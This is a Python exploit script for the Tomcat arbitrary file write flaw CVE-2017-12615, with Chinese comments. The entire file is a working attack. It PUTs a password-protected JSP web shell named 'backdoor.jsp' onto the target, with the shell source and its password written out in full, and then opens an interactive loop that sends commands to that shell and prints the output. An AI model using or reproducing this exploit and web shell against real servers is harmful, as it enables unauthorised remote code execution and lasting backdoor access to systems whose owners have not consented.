'''
Description: Tomcat 任意文件写入漏洞 (exp)
CVE: CVE-2017-12615
CNVD: 
Version: 1.0
Author: isok
Date: 2022-01-22 11:14:25
LastEditTime: 2022-01-22 15:47:05
'''

import requests
import argparse

'''
name: upload
msg: 上传带密码的回显 JSP 马
param {*} url
param {*} filename
param {*} payload
return {*}
'''
def upload(url, filename, payload):
    try:
        proxy = {
            "http":"http://127.0.0.1:8080"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0"
        }
        response = requests.put(url + filename + "/", headers = headers, data=payload, proxies=proxy)
        if response.status_code == 201 or response.status_code == 204:
            print("[+] {0} 上传成功".format(url + filename))
    except Exception as e:
        print("[-] 上传失败")
        return 0

'''
name: getshell
msg: 重复提交请求到后门文件，达到 getshell 效果
param {*} url
param {*} cmd
return {*}
'''
def getshell(url, cmd):
    while(1):
        try:
            exec_cmd = input(">>> ")
            if exec_cmd == "quit":
                break
            response = requests.get(url + cmd + exec_cmd)
            if response.status_code == 200:
                print(str(response.text).replace("<pre>","").replace("</pre>","").strip())
        except Exception as e:
            print("[-] 执行出错")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="URL", type=str, help="target url (http://url)")
    parser.add_argument("-p", "--port", dest="PORT", type=int, default=8080, help="target port")
    args = parser.parse_args()

    put_filename = "/backdoor.jsp"
    payload = '''<%
       if("us452@d".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    %>'''
    cmd = put_filename + '?pwd=us452@d&i='
    url = args.URL + ":" + str(args.PORT)
    upload(url, put_filename, payload)
    getshell(url, cmd)